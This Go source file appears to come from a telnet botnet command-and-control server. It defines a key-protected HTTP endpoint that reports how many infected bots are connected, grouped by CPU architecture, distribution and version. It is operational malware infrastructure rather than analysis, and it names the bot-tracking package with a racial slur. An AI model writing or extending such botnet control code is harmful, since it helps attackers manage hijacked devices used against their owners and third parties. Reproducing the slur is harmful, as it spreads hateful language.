package routes

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/niggers"
	"encoding/json"
	"net/http"
)

func Count(w http.ResponseWriter, r *http.Request) {
	if !r.URL.Query().Has("key") || r.URL.Query().Get("key") != config.Key {
		json.NewEncoder(w).Encode(ErrInvalidKey)
		return
	}

	json.NewEncoder(w).Encode(BotCount{
		Types: &Distribution{
			Arch:       niggers.Arches(),
			Identifier: niggers.Distribution(),
			Version:    niggers.Versions(),
		},
		Total: niggers.Count(),
	})
}
